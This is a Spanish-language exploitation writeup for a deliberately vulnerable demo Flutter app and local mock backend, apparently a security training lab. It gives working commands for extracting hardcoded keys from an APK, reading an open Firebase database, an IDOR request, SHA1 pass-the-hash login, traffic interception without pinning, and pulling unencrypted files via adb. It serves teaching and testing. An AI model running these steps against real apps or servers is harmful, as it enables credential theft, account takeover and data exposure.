# Guía de explotación (writeup)

> Todo esto se ejecuta contra el backend mock local (`backend/server.js`) y
> el APK compilado localmente por ti (este entorno no tiene Flutter SDK).
> No apunta a ningún sistema real de terceros.

## 1. Extracción de secretos hardcodeados

```bash
# Desde el APK compilado (flutter build apk):
apktool d build/app/outputs/flutter-apk/app-release.apk -o out_apktool
grep -r "AIzaSy" out_apktool/
cat out_apktool/assets/flutter_assets/.env
cat out_apktool/assets/flutter_assets/assets/postman_collection_demo.json
```
Resultado esperado: API keys, App ID y token de Postman en texto plano.

## 2. Firebase / backend sin autenticación

```bash
curl -s "https://<tu-proyecto-demo>.firebaseio.com/users.json"
```
Con las reglas de `backend/firebase-rules-demo.json` (`.read: true`), esto
devuelve todos los registros sin ningún header de autorización.

## 3. IDOR en /api/registros/consulta

```bash
# Autenticado como jgarcia, pero solicitando el documentId de mlopez:
curl -s "http://localhost:3000/api/registros/consulta?documentId=2222222222222"
```
Resultado esperado: el backend devuelve el registro de "usuario" sin verificar
que quien pregunta sea "usuario".

## 4. Sin MFA

Login exitoso solo con `username` + `passwordHash`. No hay ningún segundo
paso (OTP/push) en ningún punto de `auth_service.dart` ni `server.js`.

## 5. SHA1 sin salt + pass-the-hash

```bash
node -e "console.log(require('crypto').createHash('sha1').update('Xela2026!').digest('hex'))"
# Copiar el hash resultante y usarlo directamente, SIN conocer la contraseña:
curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"jgarcia","passwordHash":"<HASH_COPIADO>"}'
```
Resultado esperado: login exitoso solo con el hash, confirmando pass-the-hash.

## 6. Sin certificate pinning

```bash
# Con Burp Suite o mitmproxy como proxy del emulador/dispositivo, e
# instalando el certificado CA del proxy como autoridad de confianza:
mitmproxy --mode transparent
```
Resultado esperado: todo el tráfico HTTPS de la app se intercepta y
modifica sin que la app lo detecte ni cierre la conexión.

## 7. Storage local sin cifrar

```bash
adb shell run-as com.xelacoders.demo ls files/
adb shell run-as com.xelacoders.demo cat files/constancia.pdf > constancia.pdf
```
Resultado esperado: el PDF se extrae completo y legible, sin cifrado.
